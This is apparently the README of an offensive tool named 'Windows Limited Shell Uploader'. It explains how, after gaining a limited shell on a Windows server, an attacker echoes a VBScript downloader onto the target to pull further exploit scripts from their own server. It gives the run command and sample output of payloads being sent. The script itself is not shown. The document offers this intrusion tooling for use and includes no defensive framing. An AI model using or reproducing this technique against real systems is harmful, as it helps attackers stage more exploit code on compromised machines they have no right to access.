# WINDOWS LIMITED SHELL UPLOADER

suppose in post exploitation proses we were find a limited shell on target. in windows server by default there is no wget command like linux system, so we need to create our wget.vbs to download another exploit script from our server. we use "echo" command to echoing our vbs script to a file, this script may help to do it automaticaly.

#### setting up simple-vbs.txt
if you choose simple-vbs as your payload, change the server url inside the script payload.

don't forget to change the shell url inside main.py

#### command 

``` $ python main.py --file simple-wget.txt  --output wget```

#### output

```
[sending payload to the target]
[Success]
[sending payload to the target]
[Success]
[sending payload to the target]
[Success]
[sending payload to the target]
[Success]
[sending payload to the target]
[Success]
[sending payload to the target]
[Success]
[sending payload to the target]
[Success]
[sending payload to the target]
[Success]
[sending payload to the target]
[Success]
[sending payload to the target]
[Success]
````


